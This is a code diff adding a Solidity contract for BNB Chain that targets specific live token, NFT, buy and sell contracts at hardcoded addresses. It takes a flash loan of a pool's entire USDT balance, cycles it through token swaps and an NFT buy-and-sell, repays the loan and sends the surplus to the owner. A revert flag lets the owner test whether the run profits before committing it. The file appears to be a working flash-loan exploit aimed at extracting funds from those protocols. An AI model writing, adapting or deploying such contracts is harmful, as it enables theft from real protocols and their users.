@@ -1,0 +1,195 @@
+
+// File: contracts/mycontract.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.8;
+
+interface IPancakeRouter02 {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IERC721 {
+    function setApprovalForAll(address operator, bool _approved) external;
+}
+
+interface IBuy {
+    function buy(uint256 nftType, uint256 quantity) external;
+}
+
+interface ISell {
+    function sell(uint256 amount) external;
+}
+
+interface ILoan {
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes calldata data) external;
+}
+
+contract MyContract {
+    address public _owner;
+    address public _loanAddr = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
+    address public _pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address public _tokenAddr = 0xC8b44fc9e6B8FD806111A04b1f208A0087BAF9b1;
+    address public _usdtAddr = 0x55d398326f99059fF775485246999027B3197955;
+    address public _nftAddr = 0xCfedF84B29155A2c86d0F08ef8b6B0900a9Ff57A;
+    address public _buyAddr = 0x1Dcac74a508e8650C256e5B3053817D87a89039c;
+    address public _sellAddr = 0xB31Ae0d76EE85da2DF0E232E3Dc787a87266724F;
+
+    uint256 constant public MAX_INT_HEX = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
+
+    uint256 public _usdtSwap = 45000 * 10 ** 18;
+    uint256 public _nftType = 3;
+    uint256 public _quantity = 1;
+    uint256 public _nftIndex = 1047;
+    bool public _isRevert = true;
+
+    event Loan(address sender, uint256 baseAmount, uint256 quoteAmount, uint256 usdtBalance, bytes data);
+
+    constructor() {
+        _owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == msg.sender, "Ownable: caller is not the owner");
+        _;
+    }
+
+    function run() public {
+        uint256 quoteAmount = IERC20(_usdtAddr).balanceOf(address(_loanAddr));
+        bytes memory data = new bytes(10);
+        ILoan(_loanAddr).flashLoan(0, quoteAmount, address(this), data);
+    }
+
+    function approve() public {
+        // Approve token
+        IERC20(_usdtAddr).approve(_pancakeRouter, MAX_INT_HEX);
+        IERC20(_tokenAddr).approve(_pancakeRouter, MAX_INT_HEX);
+        IERC20(_tokenAddr).approve(_buyAddr, MAX_INT_HEX);
+
+        // Approve all nft for sell
+        IERC721(_nftAddr).setApprovalForAll(_sellAddr, true);
+    }
+
+    function tokenToUsdt() internal {
+        uint256 tokenBalance = IERC20(_tokenAddr).balanceOf(address(this));
+        address[] memory tokenToUsdtPath = new address[](2);
+        tokenToUsdtPath[0] = _tokenAddr;
+        tokenToUsdtPath[1] = _usdtAddr;
+        uint _deadline = block.timestamp + 1200;
+        IPancakeRouter02(_pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenBalance, 0, tokenToUsdtPath, address(this), _deadline);
+    }
+
+    function usdtToToken(uint256 _amount) internal {
+        address[] memory usdtToTokenPath = new address[](2);
+        usdtToTokenPath[0] = _usdtAddr;
+        usdtToTokenPath[1] = _tokenAddr;
+        uint _deadline = block.timestamp + 1200;
+        IPancakeRouter02(_pancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(_amount, 0, usdtToTokenPath, address(this), _deadline);
+    }
+
+    function DPPFlashLoanCall(
+        address sender,
+        uint256 baseAmount,
+        uint256 quoteAmount,
+        bytes calldata data
+    ) public {
+        uint256 usdtBalance = IERC20(_usdtAddr).balanceOf(address(this));
+        require(usdtBalance >= _usdtSwap, 'A');
+        emit Loan(sender, baseAmount, quoteAmount, usdtBalance, data);
+
+        // USDT to Token
+        usdtToToken(_usdtSwap);
+
+        // Buy
+        IBuy(_buyAddr).buy(_nftType, _quantity);
+
+        // Token to USDT
+        tokenToUsdt();
+
+        // Sell
+        ISell(_sellAddr).sell(_nftIndex);
+        _nftIndex = _nftIndex + 1;
+
+        // Token to USDT
+        tokenToUsdt();
+
+        // Send
+        IERC20(_usdtAddr).transfer(_loanAddr, quoteAmount);
+
+        // Claim
+        uint256 remainingUsdt = IERC20(_usdtAddr).balanceOf(address(this));
+        require(remainingUsdt > 0, 'Z');
+        IERC20(_usdtAddr).transfer(_owner, remainingUsdt);
+
+        require(!_isRevert, 'Revert');
+    }
+
+    function setUsdtSwap(uint256 _newUsdtSwap) public onlyOwner {
+        _usdtSwap = _newUsdtSwap;
+    }
+
+    function setNftType(uint256 _newNftType) public onlyOwner {
+        _nftType = _newNftType;
+    }
+
+    function setQuantity(uint256 _newQuantity) public onlyOwner {
+        _quantity = _newQuantity;
+    }
+
+    function setNftIndex(uint256 _newNftIndex) public onlyOwner {
+        _nftIndex = _newNftIndex;
+    }
+
+    function setIsRevert(bool _newIsRevert) public onlyOwner {
+        _isRevert = _newIsRevert;
+    }
+
+    function setTokenAddr(address _newTokenAddr) public onlyOwner {
+        _tokenAddr = _newTokenAddr;
+    }
+
+    function setNftAddr(address _newNftAddr) public onlyOwner {
+        _nftAddr = _newNftAddr;
+    }
+
+    function setBuyAddr(address _newBuyAddr) public onlyOwner {
+        _buyAddr = _newBuyAddr;
+    }
+
+    function setSellAddr(address _newSellAddr) public onlyOwner {
+        _sellAddr = _newSellAddr;
+    }
+
+    function recoverBNB() public onlyOwner {
+        address payable owner = payable(msg.sender);
+        owner.transfer(address(this).balance);
+    }
+
+    function recoverToken(address tokenAddr) public onlyOwner {
+        uint256 amount = IERC20(tokenAddr).balanceOf(address(this));
+        IERC20(tokenAddr).transfer(msg.sender, amount);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) public virtual returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+
